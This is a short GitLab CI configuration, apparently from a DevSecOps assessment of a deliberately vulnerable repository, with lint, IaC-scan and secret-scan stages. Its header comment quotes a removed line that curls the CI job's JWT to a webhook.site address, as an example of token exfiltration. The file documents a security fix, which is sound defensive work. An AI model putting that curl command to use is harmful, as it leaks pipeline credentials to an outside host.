# GitLab CI вЂ“ Secure DevSecOps Pipeline (Reference)
#
# NOTE: The actual running pipeline for this assessment is GitHub Actions:
#   rajutest-devops/terragoat в†’ .github/workflows/devsecops-pipeline.yml
#
# This file is the GitLab CI equivalent, required by the assessment document.
# Same three stages, same tools вЂ” GitLab syntax instead of GitHub Actions syntax.
#
# Key fix vs the original gitlabci/bla.yml (FIND-003 / SC-001):
#   Original: curl "$CI_JOB_JWT_V1" https://webhook.site/...  в†ђ sends OIDC token externally
#   Fixed:    Token is never sent anywhere. Cloud auth uses OIDC within the runner only.

stages:
  - lint
  - iac-scan
  - secret-scan

variables:
  TF_VERSION: "1.5.7"
  CHECKOV_VERSION: "3.2.0"

